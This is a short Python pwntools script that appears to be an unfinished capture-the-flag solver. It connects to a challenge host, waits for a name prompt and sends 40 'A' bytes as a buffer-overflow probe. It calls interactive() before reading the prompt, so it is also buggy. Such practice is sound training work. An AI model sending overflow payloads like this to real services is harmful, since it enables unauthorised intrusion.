#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13453

def make_payload():

    payload = b'A'*40
    #print(payload)

    return payload

def main():

    server = remote(HOST, PORT)
    server.interactive()
    g = server.recvuntil(b'Please enter your name: ', timeout=1)
    print(g.decode())

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
